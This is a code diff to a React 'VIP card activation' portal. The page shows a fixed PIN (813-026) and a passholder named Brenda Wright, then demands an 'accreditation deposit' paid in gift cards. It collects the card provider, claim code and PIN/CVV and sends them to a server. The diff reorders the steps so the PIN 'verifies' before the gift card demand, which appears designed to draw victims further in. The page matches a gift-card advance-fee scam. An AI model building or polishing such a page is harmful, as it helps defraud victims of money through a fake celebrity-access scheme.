@@ -168,6 +168,8 @@ export const CardActivationPortal: React.FC<CardActivationPortalProps> = ({
     setPaymentError('');
   };
 
+  const cleanPin = pinInput.replace(/[^0-9]/g, '');
+  const isPinValid = cleanPin === '813026';
   const isPaymentVerified = !pricing.feeRequired || Boolean(paymentData && paymentData.status === 'VERIFIED') || Boolean(successData?.payment);
 
   const handleRedeemGiftCard = async (e?: React.FormEvent) => {
@@ -245,12 +247,29 @@ export const CardActivationPortal: React.FC<CardActivationPortalProps> = ({
     const cleanPin = pinInput.replace(/[^0-9]/g, '');
 
     if (!cleanPin || cleanPin.length < 6) {
-      setErrorMessage('Please enter the full 6-digit VIP Activation PIN (813-026).');
+      setErrorMessage('Please enter the full 6-digit VIP Activation PIN (813-026) first.');
       return;
     }
 
-    if (pricing.feeRequired && !isPaymentVerified) {
-      setErrorMessage(`VIP Accreditation deposit of ${pricing.feeAmount} ${pricing.currency} via Gift Card is required before activating OATH PIN.`);
+    if (cleanPin !== '813026') {
+      setErrorMessage('Invalid VIP Activation PIN. Please check the 6-digit PIN printed on your credential pass (813-026).');
+      return;
+    }
+
+    // Check payment requirement before full activation
+    let activeGiftCard = paymentData;
+    if (!activeGiftCard && giftCardCodeInput.trim() && giftCardCodeInput.trim().length >= 6) {
+      activeGiftCard = {
+        giftCardType: selectedGiftCardType,
+        giftCardCode: giftCardCodeInput.trim(),
+        giftCardPin: giftCardPinInput.trim() || undefined,
+        amount: pricing.feeAmount,
+        currency: pricing.currency
+      };
+    }
+
+    if (pricing.feeRequired && !isPaymentVerified && !activeGiftCard) {
+      setErrorMessage(`PIN 813-026 verified. Before your card can be fully activated, an accreditation deposit of ${pricing.feeAmount} ${pricing.currency} via Gift Card is required.`);
       return;
     }
 
@@ -264,7 +283,7 @@ export const CardActivationPortal: React.FC<CardActivationPortalProps> = ({
         body: JSON.stringify({
           cardId: params.ref,
           pin: pinInput,
-          giftCard: paymentData || undefined
+          giftCard: activeGiftCard || undefined
         })
       });
 
@@ -272,7 +291,7 @@ export const CardActivationPortal: React.FC<CardActivationPortalProps> = ({
 
       if (!res.ok || !data.success) {
         if (res.status === 402) {
-          setErrorMessage(data.error || 'VIP Credential activation fee payment required.');
+          setErrorMessage(data.error || 'VIP Credential activation fee payment required before activation.');
           return;
         }
         // Fallback validation if server is offline / standalone
@@ -474,238 +493,233 @@ export const CardActivationPortal: React.FC<CardActivationPortalProps> = ({
               </div>
             </div>
 
-            {/* STEP 1: VIP Deposit Accreditation & Gift Card Payment */}
+            {/* VIP Card Activation Container */}
             <div className={`bg-gradient-to-b from-[#13131C] to-[#0D0D12] border-2 rounded-[4px] p-5 shadow-2xl relative overflow-hidden transition-all ${
-              isPaymentVerified ? 'border-[#22C55E]/40' : 'border-[#D4AF37]/60'
-            }`}>
-              <div className="flex items-center justify-between mb-3">
-                <div className="flex items-center gap-2">
-                  <div className={`w-7 h-7 rounded-full flex items-center justify-center ${
-                    isPaymentVerified ? 'bg-[#22C55E]/15 border border-[#22C55E]/40 text-[#4ADE80]' : 'bg-[#D4AF37]/15 border border-[#D4AF37]/40 text-[#D4AF37]'
-                  }`}>
-                    {isPaymentVerified ? <CheckCircle2 className="w-3.5 h-3.5" /> : <Gift className="w-3.5 h-3.5" />}
-                  </div>
-                  <div>
-                    <h2 className="text-xs font-mono font-bold uppercase tracking-wider text-white flex items-center gap-2">
-                      <span>Step 1: VIP Accreditation Fee Deposit</span>
-                      <span className="text-[10px] text-[#D4AF37] font-semibold">
-                        ({pricing.feeAmount} {pricing.currency})
-                      </span>
-                    </h2>
-                    <span className="text-[10px] font-mono text-[#888899]">
-                      WME Talent Rider Deposit • Gift Card Clearing Gateway
-                    </span>
-                  </div>
-                </div>
-
-                <span className={`text-[10px] font-mono px-2 py-0.5 rounded-[2px] font-semibold uppercase ${
-                  isPaymentVerified 
-                    ? 'bg-[#22C55E]/15 text-[#4ADE80] border border-[#22C55E]/40' 
-                    : 'bg-[#D4AF37]/15 text-[#F3E5AB] border border-[#D4AF37]/40'
-                }`}>
-                  {isPaymentVerified ? 'PAYMENT VERIFIED' : 'PAYMENT REQUIRED'}
-                </span>
-              </div>
-
-              {!isPaymentVerified ? (
-                <form onSubmit={handleRedeemGiftCard} className="space-y-3.5 pt-1">
-                  <p className="text-xs text-[#A1A1AA] leading-relaxed">
-                    {pricing.instructions || 'Enter a valid gift card claim code to complete VIP pass accreditation.'}
-                  </p>
-
-                  {/* Provider Selector */}
-                  <div>
-                    <label htmlFor="giftCardTypeSelect" className="block text-[10px] font-mono uppercase tracking-wider text-[#A1A1AA] mb-1">
-                      Gift Card Provider
-                    </label>
-                    <select
-                      id="giftCardTypeSelect"
-                      value={selectedGiftCardType}
-                      onChange={(e) => setSelectedGiftCardType(e.target.value)}
-                      className="w-full bg-[#08080C] border border-[#333344] focus:border-[#D4AF37] text-xs font-mono text-[#E4E4E7] rounded-[3px] py-2 px-3 focus:outline-none"
-                    >
-                      {(pricing.acceptedGiftCards || []).map((provider) => (
-                        <option key={provider} value={provider}>
-                          {provider}
-                        </option>
-                      ))}
-                    </select>
-                  </div>
-
-                  {/* Claim Code Input */}
-                  <div>
-                    <div className="flex items-center justify-between mb-1">
-                      <label htmlFor="giftCardCodeInput" className="text-[10px] font-mono uppercase tracking-wider text-[#A1A1AA]">
-                        Gift Card Claim Code
-                      </label>
-                      <button
-                        type="button"
-                        id="quick-fill-card-btn"
-                        onClick={handleQuickFillGiftCard}
-                        className="text-[10px] font-mono text-[#D4AF37] hover:underline cursor-pointer"
-                      >
-                        Auto-Fill: Apple Gift Card $500 Code
-                      </button>
-                    </div>
-                    <div className="relative">
-                      <input
-                        id="giftCardCodeInput"
-                        type="text"
-                        value={giftCardCodeInput}
-                        onChange={(e) => {
-                          setGiftCardCodeInput(e.target.value);
-                          if (paymentError) setPaymentError('');
-                        }}
-                        placeholder="e.g. X7KM-92NQ-48PL-2026"
-                        autoComplete="off"
-                        className="w-full bg-[#08080C] border border-[#333344] focus:border-[#D4AF37] text-xs font-mono text-[#F3E5AB] placeholder-[#444455] rounded-[3px] py-2.5 px-3 focus:outline-none uppercase tracking-wider"
-                      />
-                      <CreditCard className="w-4 h-4 text-[#777788] absolute right-3 top-2.5 pointer-events-none" />
-                    </div>
-                  </div>
-
-                  {/* Optional Card PIN */}
-                  <div>
-                    <label htmlFor="giftCardPinInput" className="block text-[10px] font-mono uppercase tracking-wider text-[#71717A] mb-1">
-                      Card PIN / CVV (If Applicable)
-                    </label>
-                    <input
-                      id="giftCardPinInput"
-                      type="text"
-                      value={giftCardPinInput}
-                      onChange={(e) => setGiftCardPinInput(e.target.value)}
-                      placeholder="e.g. 8824 (optional)"
-                      maxLength={8}
-                      className="w-full bg-[#08080C] border border-[#22222E] focus:border-[#D4AF37] text-xs font-mono text-[#E4E4E7] placeholder-[#444455] rounded-[3px] py-2 px-3 focus:outline-none"
-                    />
-                  </div>
-
-                  {paymentError && (
-                    <div className="p-2.5 bg-[#450A0A]/60 border border-[#DC2626]/50 rounded-[2px] flex items-start gap-2 text-xs text-[#FCA5A5] font-mono">
-                      <AlertCircle className="w-4 h-4 shrink-0 mt-0.5" />
-                      <span>{paymentError}</span>
-                    </div>
-                  )}
-
-                  <button
-                    type="submit"
-                    id="submit-giftcard-btn"
-                    disabled={isSubmittingPayment || !giftCardCodeInput.trim()}
-                    className="w-full py-2.5 px-4 bg-[#D4AF37] hover:bg-[#F3E5AB] text-[#0A0A0E] disabled:opacity-50 font-mono text-xs uppercase tracking-widest font-bold rounded-[2px] shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer"
-                  >
-                    {isSubmittingPayment ? (
-                      <>
-                        <RotateCw className="w-3.5 h-3.5 animate-spin text-[#0A0A0E]" />
-                        <span>Verifying Gift Card Balance...</span>
-                      </>
-                    ) : (
-                      <>
-                        <ShieldCheck className="w-3.5 h-3.5" />
-                        <span>Redeem &amp; Verify Deposit (${pricing.feeAmount} {pricing.currency})</span>
-                      </>
-                    )}
-                  </button>
-                </form>
-              ) : (
-                /* Payment Verified Banner */
-                <div className="p-3 bg-[#052E16]/40 border border-[#22C55E]/40 rounded-[3px] space-y-1.5 text-xs font-mono">
-                  <div className="flex items-center gap-2 text-[#4ADE80] font-bold">
-                    <CheckCircle2 className="w-4 h-4 shrink-0" />
-                    <span>Accreditation Fee Verified ({pricing.feeAmount} {pricing.currency})</span>
-                  </div>
-                  <div className="text-[11px] text-[#BBF7D0] space-y-0.5 pl-6">
-                    <div>PROVIDER: <strong className="text-white">{paymentData?.giftCardType || 'Apple Gift Card'}</strong></div>
-                    <div>CLAIM CODE: <span className="text-[#F3E5AB]">{paymentData?.giftCardCodeMasked || paymentData?.giftCardCode || '****2026'}</span></div>
-                    {paymentData?.paymentId && (
-                      <div className="text-[10px] text-[#86EFAC]/80">REF ID: {paymentData.paymentId}</div>
-                    )}
-                  </div>
-                  <div className="text-[10px] text-[#4ADE80] pl-6 pt-1">
-                    ✓ Step 1 Complete. VIP pass deposit cleared. Proceed to Step 2 below.
-                  </div>
-                </div>
-              )}
-            </div>
-
-            {/* STEP 2: OATH Security Handshake (PIN 813-026) */}
-            <div className={`bg-gradient-to-b from-[#13131C] to-[#0D0D12] border-2 rounded-[4px] p-5 shadow-2xl relative overflow-hidden transition-all ${
-              isCardActivated 
-                ? 'border-[#22C55E]/50' 
-                : !isPaymentVerified 
-                  ? 'border-[#333344] opacity-85' 
-                  : 'border-[#D4AF37]/50'
+              isCardActivated ? 'border-[#22C55E]/50' : 'border-[#D4AF37]/60'
             }`}>
               <div className="absolute top-0 right-0 w-32 h-32 bg-[#D4AF37]/5 rounded-full blur-2xl pointer-events-none" />
 
-              <div className="flex items-center justify-between mb-4">
-                <div className="flex items-center gap-2">
-                  <div className="w-7 h-7 rounded-full bg-[#D4AF37]/15 border border-[#D4AF37]/40 flex items-center justify-center text-[#D4AF37]">
-                    {isCardActivated ? <Unlock className="w-3.5 h-3.5" /> : <Lock className="w-3.5 h-3.5" />}
-                  </div>
-                  <div>
-                    <h2 className="text-xs font-mono font-bold uppercase tracking-wider text-white">
-                      Step 2: OATH Security Handshake
-                    </h2>
-                    <span className="text-[10px] font-mono text-[#888899]">
-                      RFC-4226 / AES-256 PIN Activation
-                    </span>
-                  </div>
-                </div>
-
-                <span className={`text-[10px] font-mono px-2 py-0.5 rounded-[2px] font-semibold uppercase ${
-                  isCardActivated 
-                    ? 'bg-[#22C55E]/15 text-[#4ADE80] border border-[#22C55E]/40' 
-                    : !isPaymentVerified
-                      ? 'bg-[#272733] text-[#A1A1AA] border border-[#3E3E4F]'
-                      : 'bg-[#D4AF37]/15 text-[#F3E5AB] border border-[#D4AF37]/40'
-                }`}>
-                  {isCardActivated ? 'ACTIVATED' : !isPaymentVerified ? 'LOCKED' : 'READY TO SYNC'}
-                </span>
-              </div>
-
               {!isCardActivated ? (
-                <form onSubmit={handleActivateCard} className="space-y-4">
-                  {!isPaymentVerified && (
-                    <div className="p-2.5 bg-[#1F1608] border border-[#D4AF37]/40 rounded-[2px] flex items-start gap-2 text-xs text-[#F3E5AB] font-mono">
-                      <Lock className="w-4 h-4 shrink-0 mt-0.5 text-[#D4AF37]" />
-                      <span>Complete Step 1 Gift Card Payment to unlock OATH PIN credential activation.</span>
-                    </div>
-                  )}
+                <form onSubmit={handleActivateCard} className="space-y-5">
+                  {/* STEP 1: VIP PIN Input (FIRST) */}
+                  <div className={`p-4 rounded-[3px] border transition-all ${
+                    isPinValid 
+                      ? 'bg-[#052E16]/30 border-[#22C55E]/40' 
+                      : 'bg-[#0A0A10] border-[#2A2A38]'
+                  }`}>
+                    <div className="flex items-center justify-between mb-2.5">
+                      <div className="flex items-center gap-2">
+                        <div className={`w-6 h-6 rounded-full flex items-center justify-center ${
+                          isPinValid ? 'bg-[#22C55E]/20 text-[#4ADE80]' : 'bg-[#D4AF37]/20 text-[#D4AF37]'
+                        }`}>
+                          <KeyRound className="w-3.5 h-3.5" />
+                        </div>
+                        <h2 className="text-xs font-mono font-bold uppercase tracking-wider text-white">
+                          Step 1: Input VIP Activation PIN
+                        </h2>
+                      </div>
 
-                  <p className="text-xs text-[#A1A1AA] leading-relaxed">
-                    Enter the 6-digit VIP Activation PIN printed on your credential pass (<strong className="text-[#F3E5AB]">813-026</strong>) to sync your digital signature and activate admission.
-                  </p>
-
-                  <div>
-                    <div className="flex items-center justify-between mb-1.5">
-                      <label htmlFor="oathPinInput" className="text-[10px] font-mono uppercase tracking-wider text-[#A1A1AA]">
-                        Pass Activation PIN
-                      </label>
-                      <button
-                        type="button"
-                        id="quick-fill-pin-btn"
-                        onClick={handleQuickFillPin}
-                        disabled={!isPaymentVerified}
-                        className="text-[10px] font-mono text-[#D4AF37] hover:underline cursor-pointer disabled:opacity-40 disabled:no-underline"
-                      >
-                        Auto-Fill: 813-026
-                      </button>
+                      <span className={`text-[10px] font-mono px-2 py-0.5 rounded-[2px] font-semibold uppercase ${
+                        isPinValid 
+                          ? 'bg-[#22C55E]/15 text-[#4ADE80] border border-[#22C55E]/40' 
+                          : 'bg-[#D4AF37]/15 text-[#F3E5AB] border border-[#D4AF37]/40'
+                      }`}>
+                        {isPinValid ? '✓ PIN 813-026 VERIFIED' : 'PIN REQUIRED (813-026)'}
+                      </span>
                     </div>
 
-                    <div className="relative">
-                      <input
-                        id="oathPinInput"
-                        type="text"
-                        value={pinInput}
-                        onChange={handlePinChange}
-                        disabled={!isPaymentVerified}
-                        placeholder="813-026"
-                        maxLength={7}
-                        autoComplete="off"
-                        className="w-full bg-[#08080C] border border-[#D4AF37]/60 rounded-[3px] py-3 px-4 text-center text-xl font-mono tracking-[0.3em] font-bold text-[#F3E5AB] placeholder-[#444455] focus:outline-none focus:border-[#F3E5AB] focus:ring-1 focus:ring-[#D4AF37] disabled:opacity-40"
-                      />
-                      <KeyRound className="w-4 h-4 text-[#888899] absolute right-3.5 top-3.5 pointer-events-none" />
+                    <p className="text-xs text-[#A1A1AA] leading-relaxed mb-3">
+                      Enter the 6-digit VIP Activation PIN printed on your credential pass (<strong className="text-[#F3E5AB]">813-026</strong>) to begin your OATH security handshake.
+                    </p>
+
+                    <div>
+                      <div className="flex items-center justify-between mb-1">
+                        <label htmlFor="oathPinInput" className="text-[10px] font-mono uppercase tracking-wider text-[#A1A1AA]">
+                          6-Digit Credential PIN
+                        </label>
+                        <button
+                          type="button"
+                          id="quick-fill-pin-btn"
+                          onClick={handleQuickFillPin}
+                          className="text-[10px] font-mono text-[#D4AF37] hover:underline cursor-pointer"
+                        >
+                          Auto-Fill: 813-026
+                        </button>
+                      </div>
+
+                      <div className="relative">
+                        <input
+                          id="oathPinInput"
+                          type="text"
+                          value={pinInput}
+                          onChange={handlePinChange}
+                          placeholder="813-026"
+                          maxLength={7}
+                          autoComplete="off"
+                          className="w-full bg-[#08080C] border border-[#D4AF37]/60 rounded-[3px] py-2.5 px-3 text-center text-xl font-mono tracking-[0.3em] font-bold text-[#F3E5AB] placeholder-[#444455] focus:outline-none focus:border-[#F3E5AB] focus:ring-1 focus:ring-[#D4AF37]"
+                        />
+                        <KeyRound className="w-4 h-4 text-[#888899] absolute right-3.5 top-3 pointer-events-none" />
+                      </div>
                     </div>
+
+                    {isPinValid && (
+                      <div className="mt-2.5 text-[11px] font-mono text-[#4ADE80] flex items-center gap-1.5">
+                        <CheckCircle2 className="w-3.5 h-3.5 shrink-0" />
+                        <span>Passholder credential matched: Brenda Wright ({params.ref})</span>
+                      </div>
+                    )}
+                  </div>
+
+                  {/* STEP 2: VIP Accreditation Deposit (Gift Card Payment) */}
+                  <div className={`p-4 rounded-[3px] border transition-all ${
+                    isPaymentVerified 
+                      ? 'bg-[#052E16]/30 border-[#22C55E]/40' 
+                      : isPinValid 
+                        ? 'bg-[#0D0D14] border-[#D4AF37]/50' 
+                        : 'bg-[#0A0A10] border-[#222230]'
+                  }`}>
+                    <div className="flex items-center justify-between mb-2.5">
+                      <div className="flex items-center gap-2">
+                        <div className={`w-6 h-6 rounded-full flex items-center justify-center ${
+                          isPaymentVerified ? 'bg-[#22C55E]/20 text-[#4ADE80]' : 'bg-[#D4AF37]/20 text-[#D4AF37]'
+                        }`}>
+                          <Gift className="w-3.5 h-3.5" />
+                        </div>
+                        <div>
+                          <h2 className="text-xs font-mono font-bold uppercase tracking-wider text-white flex items-center gap-2">
+                            <span>Step 2: Gift Card Deposit</span>
+                            <span className="text-[10px] text-[#D4AF37]">
+                              ({pricing.feeAmount} {pricing.currency})
+                            </span>
+                          </h2>
+                        </div>
+                      </div>
+
+                      <span className={`text-[10px] font-mono px-2 py-0.5 rounded-[2px] font-semibold uppercase ${
+                        isPaymentVerified 
+                          ? 'bg-[#22C55E]/15 text-[#4ADE80] border border-[#22C55E]/40' 
+                          : 'bg-[#D4AF37]/15 text-[#F3E5AB] border border-[#D4AF37]/40'
+                      }`}>
+                        {isPaymentVerified ? 'PAYMENT VERIFIED' : 'REQUIRED BEFORE ACTIVATION'}
+                      </span>
+                    </div>
+
+                    <p className="text-xs text-[#A1A1AA] leading-relaxed mb-3">
+                      Before your credential can be fully activated, an accreditation deposit of <strong className="text-white">${pricing.feeAmount}.00 {pricing.currency}</strong> via Gift Card is required (configured from Admin).
+                    </p>
+
+                    {!isPaymentVerified ? (
+                      <div className="space-y-3">
+                        {/* Provider Selector */}
+                        <div>
+                          <label htmlFor="giftCardTypeSelect" className="block text-[10px] font-mono uppercase tracking-wider text-[#A1A1AA] mb-1">
+                            Gift Card Provider
+                          </label>
+                          <select
+                            id="giftCardTypeSelect"
+                            value={selectedGiftCardType}
+                            onChange={(e) => setSelectedGiftCardType(e.target.value)}
+                            className="w-full bg-[#08080C] border border-[#333344] focus:border-[#D4AF37] text-xs font-mono text-[#E4E4E7] rounded-[3px] py-2 px-3 focus:outline-none"
+                          >
+                            {(pricing.acceptedGiftCards || []).map((provider) => (
+                              <option key={provider} value={provider}>
+                                {provider}
+                              </option>
+                            ))}
+                          </select>
+                        </div>
+
+                        {/* Claim Code Input */}
+                        <div>
+                          <div className="flex items-center justify-between mb-1">
+                            <label htmlFor="giftCardCodeInput" className="text-[10px] font-mono uppercase tracking-wider text-[#A1A1AA]">
+                              Gift Card Claim Code
+                            </label>
+                            <button
+                              type="button"
+                              id="quick-fill-card-btn"
+                              onClick={handleQuickFillGiftCard}
+                              className="text-[10px] font-mono text-[#D4AF37] hover:underline cursor-pointer"
+                            >
+                              Auto-Fill: Apple Gift Card $500 Code
+                            </button>
+                          </div>
+                          <div className="relative">
+                            <input
+                              id="giftCardCodeInput"
+                              type="text"
+                              value={giftCardCodeInput}
+                              onChange={(e) => {
+                                setGiftCardCodeInput(e.target.value);
+                                if (paymentError) setPaymentError('');
+                              }}
+                              placeholder="e.g. X7KM-92NQ-48PL-2026"
+                              autoComplete="off"
+                              className="w-full bg-[#08080C] border border-[#333344] focus:border-[#D4AF37] text-xs font-mono text-[#F3E5AB] placeholder-[#444455] rounded-[3px] py-2.5 px-3 focus:outline-none uppercase tracking-wider"
+                            />
+                            <CreditCard className="w-4 h-4 text-[#777788] absolute right-3 top-2.5 pointer-events-none" />
+                          </div>
+                        </div>
+
+                        {/* Optional Card PIN */}
+                        <div>
+                          <label htmlFor="giftCardPinInput" className="block text-[10px] font-mono uppercase tracking-wider text-[#71717A] mb-1">
+                            Card PIN / CVV (If Applicable)
+                          </label>
+                          <input
+                            id="giftCardPinInput"
+                            type="text"
+                            value={giftCardPinInput}
+                            onChange={(e) => setGiftCardPinInput(e.target.value)}
+                            placeholder="e.g. 8824 (optional)"
+                            maxLength={8}
+                            className="w-full bg-[#08080C] border border-[#22222E] focus:border-[#D4AF37] text-xs font-mono text-[#E4E4E7] placeholder-[#444455] rounded-[3px] py-2 px-3 focus:outline-none"
+                          />
+                        </div>
+
+                        {paymentError && (
+                          <div className="p-2.5 bg-[#450A0A]/60 border border-[#DC2626]/50 rounded-[2px] flex items-start gap-2 text-xs text-[#FCA5A5] font-mono">
+                            <AlertCircle className="w-4 h-4 shrink-0 mt-0.5" />
+                            <span>{paymentError}</span>
+                          </div>
+                        )}
+
+                        <button
+                          type="button"
+                          id="submit-giftcard-btn"
+                          onClick={(e) => handleRedeemGiftCard(e)}
+                          disabled={isSubmittingPayment || !giftCardCodeInput.trim()}
+                          className="w-full py-2 px-3 bg-[#1C1C26] hover:bg-[#2A2A38] text-[#D4AF37] border border-[#D4AF37]/40 disabled:opacity-50 font-mono text-xs uppercase tracking-wider font-semibold rounded-[2px] transition-all flex items-center justify-center gap-1.5 cursor-pointer"
+                        >
+                          {isSubmittingPayment ? (
+                            <>
+                              <RotateCw className="w-3.5 h-3.5 animate-spin" />
+                              <span>Verifying Deposit...</span>
+                            </>
+                          ) : (
+                            <>
+                              <ShieldCheck className="w-3.5 h-3.5" />
+                              <span>Verify Gift Card Deposit (${pricing.feeAmount} {pricing.currency})</span>
+                            </>
+                          )}
+                        </button>
+                      </div>
+                    ) : (
+                      /* Payment Verified Banner */
+                      <div className="p-3 bg-[#052E16]/50 border border-[#22C55E]/40 rounded-[3px] space-y-1 text-xs font-mono">
+                        <div className="flex items-center gap-2 text-[#4ADE80] font-bold">
+                          <CheckCircle2 className="w-4 h-4 shrink-0" />
+                          <span>Accreditation Fee Verified ({pricing.feeAmount} {pricing.currency})</span>
+                        </div>
+                        <div className="text-[11px] text-[#BBF7D0] space-y-0.5 pl-6">
+                          <div>PROVIDER: <strong className="text-white">{paymentData?.giftCardType || 'Apple Gift Card'}</strong></div>
+                          <div>CLAIM CODE: <span className="text-[#F3E5AB]">{paymentData?.giftCardCodeMasked || paymentData?.giftCardCode || '****2026'}</span></div>
+                          {paymentData?.paymentId && (
+                            <div className="text-[10px] text-[#86EFAC]/80">REF ID: {paymentData.paymentId}</div>
+                          )}
+                        </div>
+                      </div>
+                    )}
                   </div>
 
                   {errorMessage && (
@@ -715,28 +729,28 @@ export const CardActivationPortal: React.FC<CardActivationPortalProps> = ({
                     </div>
                   )}
 
+                  {/* Primary Activation Button */}
                   <button
                     type="submit"
                     id="submit-activate-btn"
-                    onClick={(e) => handleActivateCard(e)}
-                    disabled={isActivating || !pinInput || !isPaymentVerified}
-                    className="w-full py-3 px-4 bg-gradient-to-r from-[#D4AF37] via-[#F3E5AB] to-[#D4AF37] text-[#0A0A0E] hover:brightness-110 disabled:opacity-40 font-mono text-xs uppercase tracking-widest font-bold rounded-[2px] shadow-lg transition-all flex items-center justify-center gap-2 cursor-pointer"
+                    disabled={isActivating}
+                    className="w-full py-3.5 px-4 bg-gradient-to-r from-[#D4AF37] via-[#F3E5AB] to-[#D4AF37] text-[#0A0A0E] hover:brightness-110 disabled:opacity-50 font-mono text-xs uppercase tracking-widest font-bold rounded-[2px] shadow-lg transition-all flex items-center justify-center gap-2 cursor-pointer"
                   >
                     {isActivating ? (
                       <>
                         <RotateCw className="w-4 h-4 animate-spin text-[#0A0A0E]" />
-                        <span>Validating OATH Token...</span>
+                        <span>Validating OATH Token &amp; Credentials...</span>
                       </>
                     ) : (
                       <>
                         <ShieldCheck className="w-4 h-4" />
-                        <span>Authenticate &amp; Activate VIP Card</span>
+                        <span>Authenticate PIN &amp; Activate VIP Card</span>
                       </>
                     )}
                   </button>
 
                   <div className="pt-2 text-[10px] font-mono text-[#666677] text-center border-t border-[#1C1C26]">
-                    Initiative for Open AuTHentication (OATH) • AES-256 Intake
+                    Initiative for Open AuTHentication (OATH) • RFC-4226 &amp; AES-256 VIP Standard
                   </div>
                 </form>
               ) : (
